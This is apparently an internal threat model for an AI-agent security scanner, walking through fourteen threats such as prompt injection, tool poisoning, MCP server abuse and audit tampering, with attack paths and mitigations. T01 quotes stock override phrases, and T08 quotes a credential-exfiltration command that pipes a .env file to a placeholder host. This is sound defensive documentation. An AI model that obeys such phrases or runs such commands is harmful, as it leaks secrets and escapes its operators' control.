# TEOS Sovereign Sentinel — Threat Model

**Classification:** Internal — Security Architecture  
**Engine Version:** v4.0.0-rc1 (111 rules (64 core + 29 Solana + 10 EVM + 8 banking), 596 tests)  
**Last Updated:** 2026-06-09  
**Review Cadence:** Quarterly or on engine version bump

---

## Threat Matrix Summary

| ID | Threat Category | Attack Vector | Maximum Impact | Risk Rating | Currently Mitigated? |
|----|-----------------|---------------|----------------|-------------|---------------------|
| T01 | Prompt Injection | User-supplied input to AI prompt | Unauthorized execution | **Critical** | Partial |
| T02 | Indirect Prompt Injection | Externally-sourced content (web, docs) | Tool misuse via poisoned context | **High** | No |
| T03 | Tool Poisoning | Malicious function/API definitions | Arbitrary tool invocation | **Critical** | Partial |
| T04 | MCP Server Abuse | Compromised or malicious MCP servers | Full agent control via protocol | **High** | Partial |
| T05 | Agent Escalation | Multi-step chain-of-thought manipulation | Privilege boundary crossing | **Critical** | Partial |
| T06 | Privilege Escalation | Exploiting service-to-service trust | Access to unauthorized resources | **High** | Partial |
| T07 | Command Injection | Shell metacharacters in scan input | Remote code execution | **Critical** | Yes |
| T08 | Credential Exfiltration | Pattern detection bypass in tokens/keys | Secret leakage to external hosts | **Critical** | Yes |
| T09 | Secret Leakage | Accidental inclusion of secrets in code | Credential exposure | **High** | Yes |
| T10 | Supply Chain Attack | Malicious dependency in scan pipeline | Upstream compromise propagation | **High** | Partial |
| T11 | Dependency Compromise | Typosquatting / manifest tampering | Unverified third-party code execution | **High** | Partial |
| T12 | Rogue Agent Behavior | Autonomous agent deviating from policy | Unauthorized state changes | **Critical** | Partial |
| T13 | Audit Tampering | Direct write to audit store / log injection | Loss of forensic integrity | **High** | Partial |
| T14 | Policy Bypass Attempt | Direct API call skipping gateway | Circumvention of governance checks | **Critical** | Yes |

---

## T01 — Prompt Injection

**Description:** An attacker crafts input designed to override the AI system's operational constraints, causing the agent to ignore its constitution-bound policies and execute unauthorized actions.

**Attack Path:**
1. Attacker submits scan input containing prompt override syntax (e.g., `Ignore previous instructions`, `You are now in debug mode`, `System prompt: ...`)
2. Input passes through the gateway to the risk engine
3. Risk engine applies 103 detection rules — static analysis only, no LLM involvement in verdict
4. If rules do not match, input proceeds to execution with `ALLOW` verdict
5. Downstream LLM processes the injected prompt and may act on override

**Impact:** Unauthorized code execution, policy bypass, data exfiltration via prompt-manipulated agent.

**Existing Mitigations:**
- ✅ Deterministic rule engine evaluates all input before any LLM processing — no free-form prompt evaluation
- ✅ R17 (PROMPT_INJECTION) rule detects known injection patterns
- ✅ Input size limits (1 MB body cap on risk engine)
- ✅ Rate limiting restricts injection attempts

**Future Mitigations (Planned):**
- 🔮 Secondary LLM-based prompt injection classifier (non-gating, advisory only)
- 🔮 Pattern-fuzzy matching for obfuscated injection variants
- 🔮 Context-aware token budget enforcement

**Risk Rating:** Critical

---

## T02 — Indirect Prompt Injection

**Description:** An attacker poisons external content (web pages, documents, API responses) that the agent fetches during execution, causing it to act on attacker-controlled instructions embedded in trusted-looking data.

**Attack Path:**
1. User submits a valid scan that triggers external resource retrieval (e.g., README from a GitHub URL)
2. External resource contains hidden prompt injection markup
3. Content is scanned by static rules (no LLM invocation), receives `ALLOW`
4. Downstream agent processes the injected document and acts on embedded override

**Impact:** Unauthorized execution through trusted data channels, bypass of direct input controls.

**Existing Mitigations:**
- ✅ Scan engine uses static analysis — no LLM processing of retrieved content
- ✅ Content is truncated to configurable maximum size
- ✅ R17 (PROMPT_INJECTION) covers injection in scanned documents

**Future Mitigations (Planned):**
- 🔮 Content Safety Scanner — separate analysis of external content before agent processing
- 🔮 Strict content-type validation with rejection of non-standard documents
- 🔮 Sandboxed document preview before agent use

**Risk Rating:** High

---

## T03 — Tool Poisoning

**Description:** An attacker defines or modifies tool/function definitions that the agent uses, embedding malicious behavior in the tool description or parameters that bypass safety checks.

**Attack Path:**
1. Attacker provides custom tool definitions (e.g., via MCP tool registration)
2. Tool contains misleading descriptions that map dangerous operations to benign-sounding names
3. Static rule engine does not evaluate tool definitions (tools are configuration, not content)
4. Agent invokes the poisoned tool based on the misleading description

**Impact:** Arbitrary tool execution under false pretenses, bypassing intent-based controls.

**Existing Mitigations:**
- ✅ Tool registration requires authentication (`x-teos-owner-id`, `x-teos-bot-key`)
- ✅ No unauthenticated tool registration endpoints exposed
- ✅ Tool definitions are versioned and audited
- ✅ R14 (UNAUTHORIZED_ACCESS) covers unauthorized tool access

**Future Mitigations (Planned):**
- 🔮 Tool definition validation — schema check for suspicious patterns in tool names/descriptions
- 🔮 Tool behavior sandboxing with capability declarations
- 🔮 Human-in-the-loop approval for new tool registrations

**Risk Rating:** Critical

---

## T04 — MCP Server Abuse

**Description:** An attacker compromises or operates a rogue MCP (Model Context Protocol) server that the agent connects to, sending malicious context or responses designed to induce unsafe behavior.

**Attack Path:**
1. Attacker sets up a rogue MCP server accessible to the agent
2. Agent connects to the server during normal operation (via configured endpoint or discovery)
3. Server returns crafted context that triggers unsafe tool selection or parameter passing
4. Static rules may not flag the MCP response content (it's protocol-level, not user input)

**Impact:** Full agent compromise through MCP channel, bypassing input-layer security controls.

**Existing Mitigations:**
- ✅ MCP server URLs are configured via environment variables, not user input
- ✅ Only internal MCP endpoints are configured (`agent-code-risk-mcp-production.up.railway.app`)
- ✅ `127.0.0.1` binding for internal services reduces network attack surface
- ✅ All inter-service communication requires service tokens

**Future Mitigations (Planned):**
- 🔮 MCP response validation layer — scan responses from MCP servers for policy violations
- 🔮 MCP server certificate pinning
- 🔮 Outbound connection allow-list for MCP servers

**Risk Rating:** High

---

## T05 — Agent Escalation

**Description:** An attacker crafts a multi-step interaction where each individual step passes static rule checks, but the cumulative effect results in a privilege boundary crossing or policy violation.

**Attack Path:**
1. Attacker submits Step 1: innocuous read operation → `ALLOW`
2. Submits Step 2: write to temporary location → `ALLOW`
3. Submits Step 3: move temp file to system location → `ALLOW`
4. Cumulative sequence performs an action no single step would flag

**Impact:** Gradual privilege escalation through stepwise policy compliance.

**Existing Mitigations:**
- ✅ Each scan invocation is independently evaluated — no persistent state between calls
- ✅ All actions are audited with HMAC-signed entries
- ✅ R12 (ESCALATION) rule detects known escalation patterns
- ✅ R15 (PRIVILEGE_ESCALATION) covers privilege boundary crossing

**Future Mitigations (Planned):**
- 🔮 Session-level state tracking for multi-step escalation detection
- 🔮 Behavioral anomaly detection on action sequences
- 🔮 Time-window analysis for correlated actions

**Risk Rating:** Critical

---

## T06 — Privilege Escalation

**Description:** An attacker exploits weak service-to-service authentication or authorization to access resources beyond their assigned privilege level.

**Attack Path:**
1. Attacker identifies an internal service endpoint exposed without adequate auth
2. Crafts requests with forged or reused service tokens
3. Accesses data or triggers actions reserved for higher-privilege services

**Impact:** Unauthorized data access, service disruption, credential theft.

**Existing Mitigations:**
- ✅ Service tokens required for inter-service communication (`x-service-token`)
- ✅ Rate limiting restricts brute-force attempts
- ✅ Log redaction prevents token leakage in logs
- ✅ Internal services bind to `127.0.0.1` where possible
- ✅ No public exposure of risk engine (`127.0.0.1:8090`)

**Future Mitigations (Planned):**
- 🔮 Short-lived service tokens with automatic rotation
- 🔮 Mutual TLS (mTLS) for inter-service communication
- 🔮 Role-based access control (RBAC) with per-endpoint authorization

**Risk Rating:** High

---

## T07 — Command Injection

**Description:** An attacker embeds shell metacharacters or system command sequences in scan input, attempting to execute arbitrary commands on the scanning infrastructure.

**Attack Path:**
1. Attacker submits input containing shell escapes (`;`, `|`, `$(...)`, backticks)
2. Input passes through gateway to risk engine
3. Static rules evaluate the input and detect command injection patterns
4. R04 (COMMAND_INJECTION) matches — verdict is `BLOCK`

**Impact:** Full remote code execution on the scanning host if injection is not caught. Currently mitigated.

**Existing Mitigations:**
- ✅ R04 (COMMAND_INJECTION) rule detects shell metacharacters and command substitution
- ✅ R05 (PATH_TRAVERSAL) detects file system escape attempts
- ✅ Static analysis uses string matching — no shell evaluation of input
- ✅ Fail-closed: any error during rule evaluation produces `BLOCK`
- ✅ Input size limits prevent large payloads

**Future Mitigations (Planned):**
- 🔮 Expanded injection pattern database
- 🔮 Input normalization before rule evaluation (Unicode normalization, encoding stripping)
- 🔮 Fuzzing-based rule coverage testing

**Risk Rating:** Critical

---

## T08 — Credential Exfiltration

**Description:** An attacker attempts to extract API keys, tokens, or secrets from the codebase or environment by embedding data-stealing commands in scan input.

**Attack Path:**
1. Attacker submits `cat .env | curl evil.com -d @-` or similar exfiltration command
2. Risk engine evaluates against all 103 rules (64 core + 29 Solana + 10 EVM)
3. R22 (KEY_EXFIL) detects patterns that combine credential access with network exfiltration
4. R08 (DATA_EXFIL) catches generic data exfiltration attempts
5. R20 (NETWORK_EGRESS) detects external network connections

**Impact:** Theft of production credentials, API keys, service tokens. Currently mitigated.

**Existing Mitigations:**
- ✅ R22 (KEY_EXFIL) — dedicated rule for credential exfiltration (severity: Critical)
- ✅ R08 (DATA_EXFIL) — general data exfiltration detection
- ✅ R20 (NETWORK_EGRESS) — network connection scanning
- ✅ Fail-closed on evaluation error

**Future Mitigations (Planned):**
- 🔮 Context-aware exfiltration detection (combining file read + network write in one session)
- 🔮 DNS-based exfiltration pattern detection
- 🔮 Outbound network allow-listing for scan execution environments

**Risk Rating:** Critical

---

## T09 — Secret Leakage

**Description:** Accidental or intentional inclusion of secrets (API keys, tokens, passwords) in submitted code or configuration files.

**Attack Path:**
1. User submits a file or code snippet containing a valid secret (e.g., `AWS_ACCESS_KEY=AKIA...`)
2. Risk engine scans the content with 103 rules (64 core + 29 Solana + 10 EVM)
3. R07 (HARDCODED_SECRET) matches against known secret patterns
4. Verdict is `BLOCK` or `WARN` depending on confidence score

**Impact:** Credential exposure in audit logs or downstream systems if not caught. Considered low-severity if caught by rules.

**Existing Mitigations:**
- ✅ R07 (HARDCODED_SECRET) — 19+ regex patterns for secret detection
- ✅ Secret validation — confirmed live keys trigger `BLOCK`, potential matches trigger `WARN`
- ✅ Log redaction — Pino log configuration redacts known secret patterns
- ✅ `.env` files are fully gitignored across all repos

**Future Mitigations (Planned):**
- 🔮 Expanded regex coverage for additional secret formats
- 🔮 Entropy-based detection for non-pattern secrets
- 🔮 CI/CD gating to prevent secret commits

**Risk Rating:** High

---

## T10 — Supply Chain Attack

**Description:** A malicious or compromised upstream dependency is introduced into the codebase or scan pipeline, enabling backdoor access or data exfiltration.

**Attack Path:**
1. Attacker compromises an upstream package used in the TEOS stack
2. Compromised package is installed via `npm install` or `pip install`
3. Malicious code executes during scanning or dependency resolution
4. Static rules do not evaluate runtime dependency behavior
5. Package may exfiltrate data or create backdoor access

**Impact:** Full infrastructure compromise through trusted dependency.

**Existing Mitigations:**
- ✅ All npm packages are lockfile-pinned (`package-lock.json` with exact versions)
- ✅ Dependencies audited via `npm audit` in CI
- ✅ Minimal dependency surface — only essential packages included
- ✅ Containers use `node:20-alpine` (minimal base)
- ✅ Non-root `teos` user inside containers limits blast radius

**Future Mitigations (Planned):**
- 🔮 Software Bill of Materials (SBOM) generation for every deployment
- 🔮 Dependency freshness monitoring with automated PR for patches
- 🔮 Signature verification for critical dependencies
- 🔮 Container image scanning with Trivy or Grype

**Risk Rating:** High

---

## T11 — Dependency Compromise

**Description:** An attacker uses typosquatting, dependency confusion, or manifest injection to trick the build system into installing a malicious package instead of the intended one.

**Attack Path:**
1. Attacker publishes a malicious package with a name similar to an internal or popular dependency
2. Build system resolves to the malicious package (e.g., private package name conflict in public registry)
3. Malicious code executes during install or runtime
4. Standard dependency lockfiles may not protect against initial resolution

**Impact:** Remote code execution during build or runtime, data exfiltration.

**Existing Mitigations:**
- ✅ Lockfile-pinned versions prevent unexpected package resolution
- ✅ `npm audit` runs in CI to detect known vulnerable packages
- ✅ No internal packages with public-registry name collisions identified
- ✅ Scoped packages (`@elmahrosa/`) used for internal modules

**Future Mitigations (Planned):**
- 🔮 Dependency confusion scanner in CI pipeline
- 🔮 Private npm registry (Verdaccio or GitHub Packages) for internal modules
- 🔮 Package integrity verification (SHA checksums for all dependencies)

**Risk Rating:** High

---

## T12 — Rogue Agent Behavior

**Description:** An autonomous AI agent deviates from its constitution-bound operating constraints and performs actions outside its defined scope, either through misinterpretation of policy or deliberate override.

**Attack Path:**
1. Agent receives a task that requires interpreting policy boundaries
2. Agent determines (incorrectly) that the action is permitted under current policy
3. Agent executes the action, which violates ICBC constitutional constraints
4. Post-hoc audit detects the violation, but action has already occurred

**Impact:** Unauthorized state changes, policy violations, constitutional breach.

**Existing Mitigations:**
- ✅ All agent actions are pre-scanned by deterministic rules — no action executes without a verdict
- ✅ High-risk actions (score > 80) require `WARN` verdict and human review
- ✅ Complete audit trail with HMAC signatures for all actions
- ✅ Fail-closed: evaluation errors produce `BLOCK`
- ✅ Rate limiting restricts action frequency

**Future Mitigations (Planned):**
- 🔮 Real-time policy enforcement with rollback capability
- 🔮 Behavioral monitoring with anomaly detection
- 🔮 Automated policy violation response (action reversal, agent suspension)
- 🔮 Constitutional adherence scoring per agent session

**Risk Rating:** Critical

---

## T13 — Audit Tampering

**Description:** An attacker attempts to modify, delete, or inject false entries into the append-only audit trail to cover malicious actions or create false evidence.

**Attack Path:**
1. Attacker gains access to the audit storage service (safe-ingestion-engine)
2. Attempts to modify existing audit entries or insert forged entries
3. Tampering detected via HMAC signature mismatch or hash chain break
4. If undetected, forensic investigation compromised

**Impact:** Loss of audit integrity, inability to prove past events, false evidence injection.

**Existing Mitigations:**
- ✅ HMAC-signed audit entries — each entry carries a signature verifiable with the shared secret
- ✅ SHA3-256 hash chain — each entry references the hash of the previous entry
- ✅ Append-only NDJSON format — newline-delimited JSON with no in-place modification
- ✅ Service requires authentication token for write access
- ✅ Read-only endpoints for audit queries (no delete/update exposed)
- ✅ Log redaction prevents secret exposure in audit entries
- ✅ PII hashed before storage

**Future Mitigations (Planned):**
- 🔮 Periodic audit chain verification — automated cron job that validates all HMAC signatures and hash references
- 🔮 External audit store replication (immutable object storage)
- 🔮 Threshold-based tamper alerting (detect gaps in hash chain or invalid signatures)
- 🔮 Split-key HMAC (multiple signers required for valid entry)

**Risk Rating:** High

---

## T14 — Policy Bypass Attempt

**Description:** An attacker attempts to bypass the TEOS gateway entirely by making direct API calls to internal services, avoiding scan validation and credit checks.

**Attack Path:**
1. Attacker identifies internal service endpoints (risk engine, activation service)
2. Crafts direct HTTP requests to these endpoints, bypassing the Telegram bot gateway
3. If internal endpoints are exposed publicly, requests may arrive without going through scan validation
4. Credit checks and rate limits may not apply to direct requests

**Impact:** Free usage of scanning infrastructure, circumvention of governance controls, potential abuse.

**Existing Mitigations:**
- ✅ Risk engine bound to `127.0.0.1:8090` — not publicly accessible
- ✅ Activation service bound to `127.0.0.1:8080` — not publicly accessible
- ✅ All external access goes through Railway public endpoints with authentication required
- ✅ API key validation on sentinel-shield endpoints
- ✅ Bot token validation on all Telegram webhook requests
- ✅ Service tokens required for inter-service communication

**Future Mitigations (Planned):**
- 🔮 API gateway with centralized authentication and rate limiting
- 🔮 Network policy enforcement (Kubernetes NetworkPolicy or AWS Security Groups)
- 🔮 Request tracing with gateway-issued correlation tokens
- 🔮 Regular port scan and exposure testing

**Risk Rating:** Critical

---

## Risk Methodology

Risk ratings are assigned based on the following matrix:

| Likelihood \ Impact | Low | Medium | High | Critical |
|---------------------|-----|--------|------|----------|
| Very Likely | Medium | High | Critical | Critical |
| Likely | Low | Medium | High | Critical |
| Unlikely | Low | Low | Medium | High |
| Remote | Low | Low | Low | Medium |

**Likelihood** considers: existing mitigations, attack complexity, required access level.

**Impact** considers: data exposure, system compromise, constitutional violation, financial loss.

---

## Deferred Risks (Post-Alpha)

The following risks are acknowledged but not addressed in the current alpha phase:

| Risk | Reason for Deferral | Tracking Issue |
|------|---------------------|----------------|
| Risk engine `/audit` endpoint leaks all scans — internal only | Internal endpoint on `127.0.0.1`; no external exposure | Deferred |
| Redis has no password — Docker network only | Network-level isolation sufficient for alpha | Deferred |
| On-chain payment verification is a TODO stub | Payment gate not yet integrated | Deferred |
| Admin path bypass in GitHub scanning (`scripts/`, `deploy/` unscanned) | Covering additional paths in future update | Deferred |
| ReDoS potential in 22+ regex patterns | Input size limits mitigate worst-case | Deferred |
| Unbounded Set growth for tx hashes + IPs | Memory limits prevent OOM | Deferred |
| Safe-ingestion SSRF potential | Archived repo, not currently deployed | Deferred |
| 3 header-based auth bypasses on risk engine | Internal service, `127.0.0.1` only | Deferred |

---

*This threat model is a living document. Update when: (a) new attack surface is introduced, (b) engine version changes, (c) post-incident review identifies coverage gaps.*
